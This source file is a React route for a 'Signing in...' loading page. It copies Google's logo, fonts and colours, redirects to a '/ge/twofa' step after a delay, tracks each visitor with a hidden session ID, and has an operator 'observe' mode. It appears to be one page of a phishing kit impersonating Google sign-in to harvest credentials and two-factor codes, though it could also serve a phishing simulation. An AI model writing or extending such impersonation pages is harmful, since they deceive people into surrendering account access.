import { createFileRoute } from "@tanstack/react-router";
import { useEffect } from "react";
import { GoogleGLogo, GeGoogleFont, useGeTracking } from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/loading")({
  head: () => ({ meta: [{ title: "Signing in..." }] }),
  component: GeLoadingPage,
});

function GeLoadingPage() {
  const { sessionId, geNavigate, isObserve } = useGeTracking();

  useEffect(() => {
    if (isObserve) return;
    const t = setTimeout(() => geNavigate("/ge/twofa"), 3500);
    return () => clearTimeout(t);
  }, [isObserve, geNavigate]);

  return (
    <>
      <GeGoogleFont />
      <style>{`
        html, body, #root { min-height: 100vh; }
        body { margin: 0; background: #F0F4F9; }
        .ge-load { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 24px; color: #1f1f1f; }
        @keyframes ge-spin { to { transform: rotate(360deg); } }
        .ge-ring { width: 44px; height: 44px; border: 4px solid rgba(11,87,208,0.15); border-top-color: #0B57D0; border-radius: 50%; animation: ge-spin 0.9s linear infinite; }
        @media (prefers-color-scheme: dark) {
          body { background: #1E1F20; }
          .ge-load { color: #e3e3e3; }
          .ge-ring { border-color: rgba(168,199,250,0.25); border-top-color: #A8C7FA; }
        }
      `}</style>
      <div className="ge-load">
        <GoogleGLogo size={56} />
        <div className="ge-ring" />
      </div>
      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>{sessionId}</div>
    </>
  );
}
